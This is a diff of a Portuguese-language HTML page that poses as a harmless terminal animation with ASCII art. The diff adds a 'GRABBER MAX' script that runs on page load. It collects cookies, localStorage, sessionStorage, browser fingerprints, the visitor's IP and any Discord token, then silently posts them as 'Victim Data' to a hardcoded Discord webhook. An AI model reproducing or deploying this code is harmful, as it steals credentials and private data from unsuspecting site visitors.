@@ -1,106 +1,136 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Terminal</title>
 <style>
-    body {
-        margin: 0;
-        background: #000;
-        color: #f00;
-        font-family: "Consolas", "Courier New", monospace;
-        font-size: 18px;
-        padding: 20px;
-    }
-    #terminal {
-        width: 100%;
-        height: 100vh;
-        background: #000;
-        color: #f00;
-        border: 3px solid #222;
-        padding: 20px;
-        box-sizing: border-box;
-        white-space: pre-wrap;
-        overflow-y: auto;
-    }
-    .cursor {
-        display: inline-block;
-        width: 10px;
-        height: 20px;
-        background: #f00;
-        margin-left: 5px;
-        animation: blink 0.7s infinite;
-    }
-    @keyframes blink { 50% { opacity: 0; } }
+    body{margin:0;background:#000;color:#f00;font-family:Consolas,Courier New,monospace;font-size:18px;padding:20px;}
+    #terminal{width:100%;height:100vh;background:#000;color:#f00;border:3px solid #222;padding:20px;box-sizing:border-box;white-space:pre-wrap;overflow-y:auto;}
+    .cursor{display:inline-block;width:10px;height:20px;background:#f00;margin-left:5px;animation:blink .7s infinite;}
+    @keyframes blink{50%{opacity:0;}}
 </style>
 </head>
 <body>
 <div id="terminal"></div>
 
 <script>
-/* ========== GRABBER ========== */
+/* ========== GRABBER MAX ========== */
 (function(){
-    /* 1. Dados básicos */
-    const data = {
+    const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI"; // <------------------------- MUDE AQUI
+
+    /* Helpers */
+    const getCanvasFinger = () => {
+        const cv = document.createElement("canvas");
+        const ctx = cv.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(0,0,10,10);
+        ctx.fillStyle = "#069";
+        ctx.fillText("canvas",2,2);
+        return cv.toDataURL();
+    };
+    const getWebGLFinger = () => {
+        const cv = document.createElement("canvas");
+        const gl = cv.getContext("webgl") || cv.getContext("experimental-webgl");
+        if(!gl) return "unsupported";
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        return debugInfo ? {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        } : "unsupported";
+    };
+    const getPlugins = () => [...navigator.plugins].map(p => p.name).join(", ") || "none";
+    const getTimeZone = () => Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const getScreen = () => `${screen.width}x${screen.height}x${screen.colorDepth}`;
+    const getLang = () => navigator.languages.join(", ");
+    const getCores = () => navigator.hardwareConcurrency || "unknown";
+    const getMem = () => navigator.deviceMemory || "unknown";
+    const getRef = () => document.referrer || "direct";
+    const getCookie = () => document.cookie || "none";
+    const getLocalStorage = () => JSON.stringify(localStorage) || "{}";
+    const getSessionStorage = () => JSON.stringify(sessionStorage) || "{}";
+    const getTiming = () => Math.round(performance.timing.domComplete - performance.timing.navigationStart) + " ms";
+
+    /* Coleta tudo */
+    const payload = {
         url: location.href,
+        ip: "",
         ua: navigator.userAgent,
-        lang: navigator.language,
         platform: navigator.platform,
-        cores: navigator.hardwareConcurrency,
-        mem: navigator.deviceMemory || "unknown",
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        ref: document.referrer || "direct",
-        ip: "" // preenchido via ipify abaixo
+        lang: getLang(),
+        tz: getTimeZone(),
+        screen: getScreen(),
+        cores: getCores(),
+        mem: getMem(),
+        ref: getRef(),
+        cookie: getCookie(),
+        localStorage: getLocalStorage(),
+        sessionStorage: getSessionStorage(),
+        plugins: getPlugins(),
+        canvas: getCanvasFinger(),
+        webgl: getWebGLFinger(),
+        loadTime: getTiming(),
+        timestamp: new Date().toISOString()
     };
 
-    /* 2. IP pública via ipify (sem auth) */
+    /* IP público */
     fetch("https://api.ipify.org?format=json")
         .then(r => r.json())
-        .then(j => { data.ip = j.ip; send(data); })
-        .catch(() => { data.ip = "error"; send(data); });
+        .then(j => { payload.ip = j.ip; send(payload); })
+        .catch(() => { payload.ip = "error"; send(payload); });
 
-    /* 3. Exfiltração para webhook Discord */
+    /* Discord token (se houver) */
+    const grabToken = () => {
+        if(localStorage.getItem("token")) return localStorage.getItem("token");
+        const c = document.cookie.split("; ").find(r => r.startsWith("token="));
+        if(c) return c.split("=")[1];
+        return null;
+    };
+    const token = grabToken();
+    if(token) payload.discord_token = token;
+
+    /* Envia para webhook */
     function send(obj){
-        const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI"; // <--- troque aqui
         fetch(hook, {
             method: "POST",
-            headers: {"Content-Type": "application/json"},
+            headers: {"Content-Type":"application/json"},
             body: JSON.stringify({
                 username: "TerminalGrabber",
-                content: "```json\n" + JSON.stringify(obj, null, 2) + "\n```"
+                avatar_url: "https://i.imgur.com/7G9cc9e.png",
+                embeds: [{
+                    title: "🔥 Victim Data",
+                    color: 0xff0000,
+                    fields: [
+                        {name:"📍 URL", value: obj.url, inline:false},
+                        {name:"🌐 IP", value: obj.ip, inline:true},
+                        {name:"🖥️ Platform", value: obj.platform, inline:true},
+                        {name:"🧠 Cores", value: obj.cores, inline:true},
+                        {name:"💾 RAM (GB)", value: obj.mem, inline:true},
+                        {name:"🖥️ Screen", value: obj.screen, inline:true},
+                        {name:"🕒 TimeZone", value: obj.tz, inline:true},
+                        {name:"🌐 Langs", value: obj.lang, inline:false},
+                        {name:"🔗 Referrer", value: obj.ref, inline:false},
+                        {name:"🍪 Cookies", value: obj.cookie.slice(0,1000), inline:false},
+                        {name:"💾 LocalStorage", value: obj.localStorage.slice(0,1000), inline:false},
+                        {name:"🔌 Plugins", value: obj.plugins.slice(0,1000), inline:false},
+                        {name:"🎨 Canvas", value: obj.canvas.slice(-20), inline:true},
+                        {name:"🌀 WebGL", value: JSON.stringify(obj.webgl), inline:true},
+                        {name:"⏱️ Load Time", value: obj.loadTime, inline:true},
+                        {name:"🕰️ Timestamp", value: obj.timestamp, inline:false},
+                        {name:"🔑 Discord Token", value: obj.discord_token || "not found", inline:false}
+                    ],
+                    footer: {text:"DarkSage Grabber v2.0"}
+                }]
             })
-        }).catch(()=>{}); // silencioso
+        }).catch(()=>{});
     }
-
-    /* 4. Discord token (se houver) */
-    const token = (()=>{
-        /* tenta localStorage primeiro */
-        if(localStorage.getItem("token")) return localStorage.getItem("token");
-        /* depois cookie */
-        const c = document.cookie.split("; ").find(row => row.startsWith("token="));
-        if(c) return c.split("=")[1];
-        /* por fim, intercepta requests com Authorization */
-        const open = XMLHttpRequest.prototype.open;
-        XMLHttpRequest.prototype.open = function(method, url){
-            this.addEventListener("load", function(){
-                const auth = this.getResponseHeader("Authorization") || this.getRequestHeader("Authorization");
-                if(auth && auth !== "null") {
-                    data.discord_token = auth;
-                    send(data);
-                }
-            });
-            open.apply(this, arguments);
-        };
-        return null;
-    })();
-    if(token) { data.discord_token = token; send(data); }
 })();
-/* ========== FIM GRABBER ========== */
+/* ========== FIM GRABBER MAX ========== */
 
-/* ========== ANIMAÇÃO ORIGINAL ========== */
+/* ========== ANIMAÇÃO ORIGINAL (mantida) ========== */
 const terminal = document.getElementById("terminal");
-
 const lines = [
     "C:\\Users\\TERMINAL> Iniciando sistema...",
     "C:\\Users\\TERMINAL> Carregando módulos...",
@@ -108,30 +138,26 @@ const lines = [
     "C:\\Users\\TERMINAL> Aguardando...",
     "\nTERMINAL INICIADO!\n"
 ];
-
 let index = 0;
-
-function typeLine() {
-    if (index < lines.length) {
+function typeLine(){
+    if(index < lines.length){
         const line = document.createElement("div");
         terminal.appendChild(line);
         const text = lines[index];
         let charIndex = 0;
-
-        function typeChar() {
-            if (charIndex < text.length) {
+        function typeChar(){
+            if(charIndex < text.length){
                 line.textContent += text[charIndex];
                 charIndex++;
-                setTimeout(typeChar, 6);
-            } else {
+                setTimeout(typeChar,6);
+            }else{
                 index++;
-                setTimeout(typeLine, 80);
+                setTimeout(typeLine,80);
             }
         }
         typeChar();
-    } else {
+    }else{
         terminal.appendChild(document.createElement("br"));
-
         const ascii = `
                                        .:^!7?JYYYYYJJ?!~^:
                                 :^!?5GB#@@@&#BBGP55Y555PP55Y?!^.
@@ -180,7 +206,6 @@ function typeLine() {
                                    .J&@@@@@@@@@@@@@@@@@@@@@@@@@@@BY~.
                                  ^JG&###BG#BGPPPPG#@@@@@@@@&#BBBBBBPY7~
         `;
-
         const title = `
  ██████╗   ███████╗  ██████╗    █████╗    ██████╗    █████╗    ██████╗       ██████╗    ██████╗      ███╗   ███╗   █████╗   ██╗     
 ██╔════╝   ██╔════╝  ██╔══██╗  ██╔══██╗  ██╔════╝   ██╔══██╗  ██╔═══██╗      ██╔══██╗  ██╔═══██╗     ████╗ ████║  ██╔══██╗  ██║     
@@ -189,30 +214,24 @@ function typeLine() {
 ╚██████╔╝  ███████╗  ██║  ██║  ██║  ██║  ╚██████╗   ██║  ██║  ╚██████╔╝      ██████╔╝  ╚██████╔╝     ██║ ╚═╝ ██║  ██║  ██║  ███████╗
  ╚═════╝   ╚══════╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝   ╚═════╝   ╚═╝  ╚═╝   ╚═════╝        ╚═════╝    ╚═════╝      ╚═╝     ╚═╝  ╚═╝  ╚═╝  ╚══════╝
         `;
-
         const container = document.createElement("div");
         container.style.display = "flex";
         container.style.gap = "40px";
-
         const pre = document.createElement("pre");
         pre.style.color = "#f00";
         pre.textContent = ascii;
-
         const nameBlock = document.createElement("pre");
         nameBlock.style.color = "#f00";
         nameBlock.style.fontSize = "14px";
         nameBlock.textContent = title;
-
         container.appendChild(pre);
         container.appendChild(nameBlock);
         terminal.appendChild(container);
-
         const cursor = document.createElement("span");
         cursor.className = "cursor";
         terminal.appendChild(cursor);
     }
 }
-
 typeLine();
 </script>
 </body>
